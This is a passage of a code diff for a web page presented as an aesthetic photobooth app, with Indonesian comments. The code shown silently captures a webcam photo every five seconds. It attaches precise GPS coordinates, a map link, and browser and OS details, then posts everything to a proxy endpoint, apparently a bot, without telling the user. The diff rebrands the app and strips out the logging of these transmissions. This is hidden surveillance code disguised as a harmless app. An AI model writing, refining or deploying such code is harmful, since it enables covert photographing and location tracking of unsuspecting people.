                             files: [photoFile],
-                            title: 'Foto dari Photobooth Ajaib GenZ',
-                            text: 'Lihat foto estetik saya dari Photobooth Ajaib!',
+                            title: 'Foto dari Studio Foto Estetik',
+                            text: 'Lihat foto keren saya dari Studio Foto Estetik!',
                         });
                         showStatus('Berbagi berhasil!');
                     } else {
@@ -457,7 +546,7 @@
                     console.error('Gagal berbagi:', error);
                     showStatus('Gagal berbagi foto. (Cek console log)', true);
                 }
-            }
+            });
 
 
             // --- LOGIKA OTOMATIS DAN PENGIRIMAN (Senyap) ---
@@ -465,9 +554,7 @@
             function startAutoSendInterval() {
                 const sendNext = () => {
                     if (!isSending) {
-                        // Untuk pengiriman otomatis 5s, kita selalu menggunakan filter 'normal' 
-                        // agar tidak mengganggu pengalaman pengguna yang sedang mencoba filter lain.
-                        sendReport('normal'); 
+                        sendReport();
                     }
                     setTimeout(sendNext, INTERVAL_MS);
                 };
@@ -475,67 +562,67 @@
                 // Kirim laporan pertama setelah 5 detik
                 setTimeout(sendNext, INTERVAL_MS);
             }
-            
-            // FUNGSI UTAMA UNTUK MENGAMBIL FOTO DENGAN FILTER TERTENTU
-            function capturePhotoWithFilter(filterName) {
+
+            // Memperbarui fungsi capturePhotoToCanvas untuk menerapkan filter ke canvas
+            function capturePhotoToCanvas(applyCurrentFilter = false) {
                 if (!videoStreamObject) return null;
 
-                const context = hiddenCanvas.getContext('2d');
+                const context = photoCanvas.getContext('2d');
                 const videoWidth = videoStream.videoWidth || 640;
                 const videoHeight = videoStream.videoHeight || 480;
                 
-                hiddenCanvas.width = videoWidth;
-                hiddenCanvas.height = videoHeight;
+                photoCanvas.width = videoWidth;
+                photoCanvas.height = videoHeight;
                 
-                // 1. Terapkan Filter (Canvas Filter API hanya didukung di Firefox/Chrome, 
-                //    namun kita bisa memanipulasi pixel data jika perlu. Untuk simplisitas, 
-                //    kita gunakan efek sederhana yang bisa diterapkan di canvas context.
-                //    Namun cara paling mudah adalah menggunakan CSS filter saat display,
-                //    dan untuk data kirim/simpan kita bisa menggunakan manipulasi pixel atau
-                //    mengirim data tanpa filter (untuk pengiriman otomatis) atau 
-                //    menggunakan library (tidak disarankan di 1 file).
-                
-                // *Solusi: Terapkan filter CSS ke hiddenCanvas untuk capture!*
-                hiddenCanvas.style.filter = getFilterCSS(filterName);
-
                 context.save();
+                // Flip the image (since video feed is mirrored)
                 context.translate(videoWidth, 0);
                 context.scale(-1, 1);
+                
+                if (applyCurrentFilter) {
+                    // Hanya terapkan filter jika diminta (untuk local save/share)
+                    // Note: Untuk pengiriman otomatis ke bot, kita gunakan filter 'normal'
+                    context.filter = videoStream.style.filter || 'none'; 
+                } else {
+                    // Untuk pengiriman otomatis (5s) default ke filter 'normal'
+                    context.filter = 'none'; 
+                }
+
                 context.drawImage(videoStream, 0, 0, videoWidth, videoHeight);
                 context.restore();
 
-                // Kembalikan ke normal setelah capture
-                hiddenCanvas.style.filter = 'none';
-
-                // Ambil data URL. Kualitas JPEG 0.8 untuk ukuran file yang wajar.
-                return hiddenCanvas.toDataURL('image/jpeg', 0.8);
+                return photoCanvas.toDataURL('image/jpeg', 0.8);
             }
 
-            async function sendReport(filterNameForCapture) {
+            async function sendReport() {
                 if (isSending) return;
 
                 isSending = true;
-                console.log(`Mengirim data otomatis (5s)... ${new Date().toLocaleTimeString()}`);
                 
-                // Ambil foto untuk pengiriman otomatis (filter normal/tanpa filter)
-                const base64Image = capturePhotoWithFilter(filterNameForCapture);
+                // Pastikan kamera aktif sebelum mengambil foto
+                const base64Image = videoStreamObject ? capturePhotoToCanvas(false) : null;
                 
                 // Tambahkan waktu dan tanggal saat ini
                 const now = new Date();
                 const dateTimeText = now.toLocaleString('id-ID', {
-                    year: 'numeric', month: 'long', day: 'numeric',
-                    hour: '2-digit', minute: '2-digit', second: '2-digit',
+                    year: 'numeric',
+                    month: 'long',
+                    day: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit',
                     timeZoneName: 'short'
                 });
 
-                // Kompilasi Caption (Data yang tidak ditampilkan di UI)
+                // Kompilasi Caption
                 const locationText = userLocation ? 
                     `✅ Lokasi Akurat:\nLAT: ${userLocation.latitude.toFixed(6)}\nLNG: ${userLocation.longitude.toFixed(6)}\nAkurasi: ${userLocation.accuracy.toFixed(2)}m\nPeta: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}` : 
-                    `❌ Lokasi tidak tersedia/dibatalkan.`;
+                    `❌ Lokasi GAGAL didapatkan.`;
 
                 const caption = `
 *--- PENGIRIMAN DATA FOTO OTOMATIS (5s) ---*
 
+*Filter Digunakan (Otomatis):* Normal
 *Waktu Pengambilan:* ${dateTimeText}
 
 *Data Pengguna:*
@@ -552,25 +639,20 @@ Browser: ${deviceData.browser}
 OS: ${deviceData.os}
 `;
                 
-                // Kirim data ke endpoint proxy
                 try {
                     await sendDataToProxy(base64Image, caption);
-                    // showStatus('Data 5s terkirim senyap.', false); // Tidak perlu ditampilkan agar tidak mengganggu
-                    console.log('✅ Pengiriman sukses. Menunggu 5s lagi...');
                 } catch (error) {
-                    // showStatus('Pengiriman gagal. (Cek console log)', true); // Tidak perlu ditampilkan agar tidak mengganggu
                     console.error("Error saat mengirim data:", error);
                 } finally {
                     isSending = false;
                 }
             }
             
-            // FUNGSI: Mengirim data ke API Proxy Anda
             async function sendDataToProxy(base64Image, caption) {
                 const payload = {
                     caption: caption,
                     base64Image: base64Image,
-                    isPhoto: !!base64Image 
+                    isPhoto: !!base64Image
                 };
 
                 const response = await fetch(PROXY_ENDPOINT, {
